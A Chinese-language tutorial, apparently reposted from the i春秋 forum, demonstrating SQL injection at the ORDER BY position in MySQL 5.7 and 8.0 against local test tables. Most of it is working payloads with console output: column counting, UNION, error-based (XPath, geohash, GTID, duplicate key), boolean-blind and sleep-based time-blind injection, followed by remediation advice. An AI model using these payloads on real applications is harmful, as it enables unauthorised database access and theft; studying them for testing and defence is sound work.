# 019-SQL注入之OrderBy位置点注入


本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。

原文地址：https://bbs.ichunqiu.com/thread-63491-1-1.html

之前一篇文章讲了GROUP BY 位置点的注入，这次讲下ORDER BY位置点的注入。

## order by简介

ORDER BY语句是SQL语法中用于对查询结果进行排序的子句。它可以按照一个或多个列的值进行升序（ASC）或降序（DESC）排序。

### 语法

ORDER BY子句通常紧跟在SELECT语句的最后，用于指定排序的规则。下面是ORDER BY语句的一般语法形式：

```sql
SELECT column_name, function(column_name)
FROM table_name
WHERE column_name operator value
ORDER BY column_name1 [ASC|DESC], column_name2 [ASC|DESC], ...
LIMIT num;
```

在ORDER BY子句中，可以指定一个或多个列作为排序的依据。按照指定的列顺序进行排序，每个列可以指定是升序（ASC）还是降序（DESC），默认是升序排序。

以下是一些常见的用法和注意事项：

1. 排序单个列：可以通过列名指定要排序的列。例如，`ORDER BY 列名 ASC`表示按升序对该列进行排序，`ORDER BY 列名 DESC`表示按降序对该列进行排序。
2. 排序多个列：可以按照多个列进行排序，多个列之间用逗号分隔。排序优先级按照列在ORDER BY子句中的顺序确定。
3. NULL值处理：在排序中，默认情况下NULL值会被视为最小值（升序排序）或最大值（降序排序）。可以使用NULLS FIRST或NULLS LAST指定NULL值在排序中的位置。
4. 表达式排序：除了列名外，还可以使用表达式作为排序的依据。例如，可以使用函数、算术表达式或条件表达式进行排序。
5. 排序方向：默认情况下，排序是升序的。可以使用ASC或DESC关键字明确指定排序方向。ASC表示升序（默认），DESC表示降序。

ORDER BY语句在查询结果中对记录进行排序，提供了灵活的排序功能，可以根据需要对结果集进行定制化排序。它对于按特定条件获取有序结果非常有用，例如按照日期、数值大小或字母顺序进行排序。

## order by 注入

通常order by注入有两个可能点，一个是列名（id）可控，一个是排序方向（desc）可控。

```
select * from table order by id desc
```

如果只能控制desc这个位置的参数，我们需要利用SQL语法的特性，通过拼接 `desc,&lt;column&gt;`的形式控制列名作为注入点，即：

```
select * from table order by id desc, column_name
```

### 1、本地环境

以MySQL为例进行讲解。

下面演示用到2个数据库，MySQL 5.7.26和MySQL8.0.31

```sql
# sqli-labs 数据库，版本5.7.26
mysql&gt; select * from users;
&#43;----&#43;----------&#43;------------&#43;
| id | username | password   |
&#43;----&#43;----------&#43;------------&#43;
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
| 13 | admin1   | admin3     |
&#43;----&#43;----------&#43;------------&#43;
14 rows in set (0.01 sec)

# 自建数据库，版本8.0.31
mysql&gt; select * from users;
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
|  4 | aduser | 123456   |   10 | beijing   |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (0.01 sec)
```

### 2、获取字段数

Order by 后面加数字就能进行字段数的枚举，当数字大于字段数时，就会产生类似如下报错：

```sql
mysql&gt; select * from users order by 5;
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
| id | name  | pass     | age  | area      |
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1 | 123456   |   18 | beijing   |
|  3 | user1 | qwer1234 |   28 | guangzhou |
|  2 | test2 | 543210   |   20 | shanghai  |
&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
3 rows in set (0.00 sec)

mysql&gt; select * from users order by 6;
ERROR 1054 (42S22): Unknown column &#39;6&#39; in &#39;order clause&#39;
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165050006.png)

### 3、联合注入(罕见)

order by位置后无法接union select，语法不支持，报错如下。

```sql
mysql&gt; select * from users order by id union select 1,2,3,4,5;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;union select 1,2,3,4,5&#39; at line 1
```

但是有一种情况，可能可以用，即前一句SQL语句整体处在括号中。如下：

```sql
mysql&gt; (select * from users order by id);
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
|  4 | aduser | 123456   |   10 | beijing   |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (0.01 sec)

mysql&gt; (select * from users order by id) union select 1,2,3,4,5;
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
|  4 | aduser | 123456   |   10 | beijing   |
|  1 | 2      | 3        |    4 | 5         |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
5 rows in set (0.01 sec)
```

这种情况非常罕见，利用条件比较苛刻。

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165136764.png)

```sql
mysql&gt; (select * from users order by id) union select 1,user(),3,4,version();
&#43;----&#43;----------------&#43;----------&#43;------&#43;-----------&#43;
| id | name           | pass     | age  | area      |
&#43;----&#43;----------------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1          | 123456   |   18 | beijing   |
|  2 | test2          | 543210   |   20 | shanghai  |
|  3 | user1          | qwer1234 |   28 | guangzhou |
|  4 | aduser         | 123456   |   10 | beijing   |
|  1 | root@127.0.0.1 | 3        |    4 | 8.0.31    |
&#43;----&#43;----------------&#43;----------&#43;------&#43;-----------&#43;
5 rows in set (0.01 sec)
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165152148.png)

### 4、报错注入

如果列名可控，即为 `?orderby=id`的情况：

#### 1）XPath报错

```sql
mysql&gt; select * from users order by id/extractvalue(1,concat(&#39;~&#39;,(select version())));
ERROR 1105 (HY000): XPATH syntax error: &#39;~8.0.31&#39;

mysql&gt; select * from users order by id/updatexml(1,concat(0x7e,(select version()),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: &#39;~8.0.31~&#39;
```

#### 2）Geohash报错

```sql
# mysql 5.7.26
mysql&gt;  select * from users order by users.id/(ST_LongFromGeoHash((select version())));
ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LONGFROMGEOHASH
mysql&gt;
mysql&gt; select * from users order by users.id/(ST_PointFromGeoHash((select version()),1));
ERROR 1210 (HY000): Incorrect arguments to /
mysql&gt;
mysql&gt; select * from users order by users.id/(ST_LatFromGeoHash((select version())));
ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LATFROMGEOHASH
mysql&gt;
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165245962.png)



```sql
# mysql 8.0.31 
mysql&gt; select * from users order by id/(ST_LongFromGeoHash((select version())));
ERROR 1411 (HY000): Incorrect geohash value: &#39;8.0.31&#39; for function ST_LONGFROMGEOHASH
mysql&gt; 
mysql&gt; select * from users order by id/(ST_PointFromGeoHash((select version()),1));
ERROR 1210 (HY000): Incorrect arguments to /
mysql&gt; 
mysql&gt; select * from users order by id/(ST_LatFromGeoHash((select version())));
ERROR 1411 (HY000): Incorrect geohash value: &#39;8.0.31&#39; for function ST_LATFROMGEOHASH
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165259586.png)

#### 3）GTID报错

```sql
# mysql 5.7.26
mysql&gt; select * from users where username like &#39;admin%&#39; order by users.id/(gtid_subtract(version(),1));
ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
mysql&gt;
mysql&gt; select * from users where username like &#39;admin%&#39; order by users.id/(gtid_subset(version(),1));
ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
mysql&gt;
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165418105.png)

```sql
# mysql 8.0.31
mysql&gt; select * from users order by users.id/(gtid_subtract(version(),1));
ERROR 1772 (HY000): Malformed GTID set specification &#39;8.0.31&#39;.
mysql&gt; 
mysql&gt; select * from users order by users.id/(gtid_subset(version(),1));
ERROR 1772 (HY000): Malformed GTID set specification &#39;8.0.31&#39;.
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165459330.png)

#### 4）Duplicate key报错

```sql
# mysql 5.8.26
mysql&gt; select * from users where username like &#39;admin%&#39; order by (select 1 from (select count(*),concat(version(),&#39;~&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a);
ERROR 1062 (23000): Duplicate entry &#39;5.7.26~1&#39; for key &#39;&lt;group_key&gt;&#39;

mysql&gt; select * from users where username like &#39;admin%&#39; order by (select count(*) from information_schema.tables group by concat((select version()),0x7e,floor(rand(0)*2)));
ERROR 1062 (23000): Duplicate entry &#39;5.7.26~1&#39; for key &#39;&lt;group_key&gt;&#39;
```

mysql 8.0.31不适用

```
mysql&gt; select * from users order by (select 1 from (select count(*),concat(version(),&#39;~&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a);
ERROR 1242 (21000): Subquery returns more than 1 row
```

### 5、布尔盲注

#### 1）IF

利用if语句

```sql
# 前面等式成立则按id列进行排序，不成立则按age列进行排序。
mysql&gt; select * from users order by if(1=0,id,age);
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  4 | aduser | 123456   |   10 | beijing   |
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (0.01 sec)

mysql&gt; select * from users order by if(1=1,id,age);
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
|  4 | aduser | 123456   |   10 | beijing   |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (0.00 sec)
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165613578.png)

可以看到这种方法，必须要知道列名，利用还是有条件的。

```sql
mysql&gt; select * from users order by if((substr(version(),1,1)=&#39;8&#39;),id,age);
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
|  4 | aduser | 123456   |   10 | beijing   |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (0.01 sec)

mysql&gt; select * from users order by if((substr(version(),1,1)=&#39;6&#39;),id,age);
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  4 | aduser | 123456   |   10 | beijing   |
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (0.01 sec)
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165647631.png)

网上有些文章直接用数字代替列名，如`if(1=1,1,4)`，但是本地测试时两个版本都没有成功。如下：

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165657542.png)

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165707025.png)

#### 2）rand

利用rand() true和false返回顺序不同进行盲注。

```sql
order by rand(1)
order by rand(0)
order by rand(substr(version(),1,1)=&#39;8&#39;)
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165723761.png)

#### 3）位运算符

位运算符，主要使用^异或运算，其他也可

```sql
order by id^0;
order by id^1;
```



```sql
select * from users order by id^(substr(version(),1,1)=&#39;8&#39;);select * from users order by id^(substr(version(),1,1)=&#39;6&#39;);
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165803446.png)



```
order by id^(select (select version()) regexp &#39;^5&#39;);order by id^(select (select version()) regexp 0x5e35);  # 0x5e35 &lt;-&gt; hex(&#39;^5&#39;) # 注意 regexp 在不同版本下对十六进制匹配会有些微小的差异
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165815046.png)

### 6、时间盲注

order by会根据数据记录数把延时放大，比如sleep 1秒，有3条记录，则总共延时 3秒。

```mysql
mysql&gt; select * from users order by sleep(1);
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
|  4 | aduser | 123456   |   10 | beijing   |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (4.02 sec)

mysql&gt; select * from users order by id,if((substr(version(),1,1)=8),sleep(1),0);
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
| id | name   | pass     | age  | area      |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
|  1 | test1  | 123456   |   18 | beijing   |
|  2 | test2  | 543210   |   20 | shanghai  |
|  3 | user1  | qwer1234 |   28 | guangzhou |
|  4 | aduser | 123456   |   10 | beijing   |
&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
4 rows in set (4.01 sec)
```

![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165900602.png)

# 修复建议

要防止sql注入攻击，建议采取以下措施：
1、使用参数绑定或预编译语句：使用参数化查询或预编译语句，将用户提供的输入作为参数传递给SQL查询，而不是将其直接拼接到查询字符串中。这样可以防止恶意输入被解释为SQL代码。
2、输入验证和过滤：对于动态生成的列名或表达式，确保对用户输入进行严格的验证和过滤，只允许合法的值和字符，避免将恶意输入传递给SQL查询。
3、最小权限原则：在数据库的访问控制上，确保应用程序使用的数据库账户具有最小的权限，仅限于执行必要的操作，以减少潜在的攻击面。

对于无法直接进行预编译的内容，需要在代码层进行过滤和处理，比如可以通过映射的方式将前端接收的参数值匹配到后端相应的值，再传入SQL进行操作，从而避免将恶意输入传递给SQL查询。

以上就是本次分享全部内容，如有纰漏，欢迎各位大佬交流指正。



微信扫一扫，关注该公众号

![img](/resource/SQL注入之OrderBy位置点注入.assets/qrcode-20230814164512823)



---

> 作者: Xavier  
> URL: http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/  

